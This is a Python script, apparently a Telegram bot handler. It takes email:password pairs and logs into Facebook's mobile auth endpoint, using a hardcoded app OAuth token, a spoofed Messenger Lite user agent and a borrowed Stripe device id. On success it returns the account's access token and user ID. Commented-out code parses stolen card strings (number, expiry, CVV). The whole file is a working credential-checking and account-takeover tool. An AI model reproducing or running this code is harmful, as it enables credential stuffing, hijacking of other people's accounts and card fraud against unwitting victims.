import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os

from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, Filters

SK = os.getenv('SK')
session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'

def tkfb(input):
  #if len(input) == 0:
      #return ("<b>No Card to cv</b>")

  #x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  #if x:
    #card = x.group(0)

  #ccn, mm, yy, cvv = card.split('|',4)
  #if mm.startswith('2'):
      #mm, yy = yy, mm
  #if len(mm) >= 3:
      #mm, yy, cvv = yy, cvv, mm
  #if len(ccn) < 15 or len(ccn) > 16:
      #return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 


  

  x = input.split(':')
  print(x)
  u = x[0]
  print(u)
  p = x[1]
  print(p)
  
  
  
  
  time1 = time.time()
  b = session.get('https://ip.seeip.org/').text

  s = session.post('https://m.stripe.com/6')
  r = s.json()
  Guid = r['guid']

        # hmm
  load = {
            'email':u,
  'password':p,
  'credentials_type':'password',
  'error_detail_type':'button_with_disabled',
  'format':'json',
  'device_id':Guid,
  'generate_session_cookies':'1',
  'generate_analytics_claim':'1',
  'generate_machine_id':'1',
  'method':'POST'
        }

  header = {
            'Authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N976N Build/N2G47O) [FBAN/MessengerLite;FBAV/298.0.0.14.115;FBPN/com.facebook.mlite;FBLC/vi_VN;FBBV/363484827;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-N976N;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1600,height=900};]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'b-graph.facebook.com',
'Connection': 'Keep-Alive',
'Accept-Encoding': 'gzip, deflate',
'Content-Length': '208'
}

  rx =  requests.post('https://b-graph.facebook.com/auth/login',
                          data=load, headers=header)
  res = rx.json()
  print(res)
  
  
  time2 = time.time()
  if 'error' in res:
     msg = res['error']['message']
     return (f'''
     <b>{msg}</b>
     ''')
  if 'access_token' in res:
        uid = res['uid']
        token = res['access_token']
        return (f'''
<b>TOKEN:</b><code>{token}</code>
<b>UID:</b><code>{uid}</code>
 ''')